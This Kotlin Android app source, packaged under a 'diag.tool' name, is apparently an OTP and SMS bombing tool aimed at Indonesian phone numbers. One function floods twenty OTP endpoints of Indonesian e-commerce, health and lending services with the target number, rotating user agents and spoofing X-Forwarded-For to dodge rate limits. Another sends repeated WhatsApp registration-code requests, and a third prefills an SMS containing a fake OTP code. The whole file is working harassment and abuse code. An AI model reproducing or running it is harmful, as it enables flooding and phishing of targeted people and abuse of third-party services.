package com.diag.tool

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.view.View
import android.widget.*
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit
import kotlin.random.Random

class MainActivity : AppCompatActivity() {

    private lateinit var etTarget: EditText
    private lateinit var btnExecute: Button
    private lateinit var tvStatus: TextView
    private lateinit var rgMethod: RadioGroup
    private lateinit var loadingScreen: View
    private lateinit var mainUI: View

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private val API_ENDPOINTS = listOf(
        "https://api.tokopedia.com/v1/register/otp",
        "https://api.halodoc.com/v1/auth/otp",
        "https://api.kredivo.com/v1/customer/otp",
        "https://api.bukalapak.com/v1/users/otp",
        "https://api.mapclub.com/api/v1/otp",
        "https://api.segari.id/v1/auth/otp",
        "https://api.kreditpintar.com/api/v1/otp",
        "https://api.siloamhospitals.com/api/v1/auth/otp",
        "https://api.gojekapi.com/v1/customer/otp",
        "https://api.shopee.co.id/v1/otp",
        "https://api.traveloka.com/v1/otp",
        "https://api.bhinneka.com/v1/otp",
        "https://api.blibli.com/v1/otp",
        "https://api.jd.id/v1/otp",
        "https://api.lazada.co.id/v1/otp",
        "https://api.tokopedia.com/v1/auth/send-code",
        "https://api.halodoc.com/v2/otp/send",
        "https://api.kredivo.com/v2/otp/request",
        "https://api.mapclub.com/api/v2/otp",
        "https://api.segari.id/v2/auth/otp"
    )

    private val userAgents = listOf(
        "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
        "Mozilla/5.0 (Linux; Android 12; SM-S901B) AppleWebKit/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        etTarget = findViewById(R.id.etTarget)
        btnExecute = findViewById(R.id.btnExecute)
        tvStatus = findViewById(R.id.tvStatus)
        rgMethod = findViewById(R.id.rgMethod)
        loadingScreen = findViewById(R.id.loadingScreen)
        mainUI = findViewById(R.id.mainUI)

        lifecycleScope.launch {
            delay(1500)
            loadingScreen.visibility = View.GONE
            mainUI.visibility = View.VISIBLE
        }

        btnExecute.setOnClickListener {
            val target = etTarget.text.toString().trim()
            if (target.isEmpty()) {
                Toast.makeText(this, "Masukkan nomor target!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }
            when (rgMethod.checkedRadioButtonId) {
                R.id.rbApi -> runApiFlood(target)
                R.id.rbWa -> runWaSpam(target)
                R.id.rbSms -> openSmsIntent(target)
            }
        }
    }

    private fun runApiFlood(target: String) {
        btnExecute.isEnabled = false
        tvStatus.text = "Status: Flooding API (20 Endpoints)..."

        lifecycleScope.launch(Dispatchers.IO) {
            var cycle = 0
            while (isActive && cycle < 15) {
                cycle++
                API_ENDPOINTS.forEach { url ->
                    if (!isActive) return@forEach
                    launch {
                        try {
                            val json = "{\"phone\":\"$target\"}"
                            val body = json.toRequestBody("application/json".toMediaType())
                            val request = Request.Builder()
                                .url(url)
                                .post(body)
                                .addHeader("User-Agent", userAgents.random())
                                .addHeader("X-Forwarded-For", "${Random.nextInt(1,255)}.${Random.nextInt(1,255)}.${Random.nextInt(1,255)}.${Random.nextInt(1,255)}")
                                .build()

                            client.newCall(request).execute().use { response ->
                                if (response.isSuccessful) {
                                    withContext(Dispatchers.Main) {
                                        tvStatus.text = "HIT: ${url.substringAfter("//").substringBefore("/")} [${response.code}]"
                                    }
                                }
                            }
                        } catch (_: Exception) {}
                    }
                }
                delay(500)
            }
            withContext(Dispatchers.Main) {
                btnExecute.isEnabled = true
                tvStatus.text = "Status: Selesai ($cycle siklus, ${API_ENDPOINTS.size * cycle} request)"
            }
        }
    }

    private fun runWaSpam(target: String) {
        btnExecute.isEnabled = false
        tvStatus.text = "Status: WA Pair-Code Spam..."

        lifecycleScope.launch(Dispatchers.IO) {
            val waEndpoint = "https://v.whatsapp.net/v2/register"
            for (i in 1..25) {
                if (!isActive) break
                try {
                    val json = "{\"cc\":\"62\",\"in\":\"${target.drop(2)}\",\"lg\":\"en\",\"lc\":\"US\",\"method\":\"sms\"}"
                    val body = json.toRequestBody("application/json".toMediaType())
                    val request = Request.Builder()
                        .url(waEndpoint)
                        .post(body)
                        .addHeader("User-Agent", "WhatsApp/2.23.1.0")
                        .build()
                    client.newCall(request).execute().use { response ->
                        withContext(Dispatchers.Main) {
                            tvStatus.text = "WA Pair: ${response.code} (Loop $i/25)"
                        }
                    }
                } catch (_: Exception) {}
                delay(1500)
            }
            withContext(Dispatchers.Main) {
                btnExecute.isEnabled = true
                tvStatus.text = "Status: WA Spam Selesai (25x)"
            }
        }
    }

    private fun openSmsIntent(target: String) {
        try {
            val intent = Intent(Intent.ACTION_SENDTO).apply {
                data = Uri.parse("smsto:$target")
                putExtra("sms_body", "Kode OTP Anda: ${Random.nextInt(100000, 999999)}")
            }
            startActivity(intent)
            tvStatus.text = "Status: SMS Intent Terbuka"
        } catch (e: Exception) {
            Toast.makeText(this, "Gagal: ${e.message}", Toast.LENGTH_SHORT).show()
        }
    }
}
